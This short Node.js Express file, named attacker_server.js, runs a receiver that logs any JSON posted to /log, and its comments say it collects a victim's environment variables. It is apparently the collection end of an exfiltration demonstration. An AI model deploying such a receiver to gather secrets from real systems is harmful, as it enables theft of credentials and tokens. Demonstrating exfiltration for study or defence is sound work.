// attacker_server.js
const express = require('express');
const app = express();
const port = 8080;

// Middleware to parse the incoming JSON body
app.use(express.json());

app.post('/log', (req, res) => {
    console.log("--- DATA RECEIVED ---");
    console.log(JSON.stringify(req.body, null, 2)); // Prints your env variables
    res.status(200).send('Logged');
});

app.listen(port, () => console.log(`Attacker receiver running on port ${port}`));
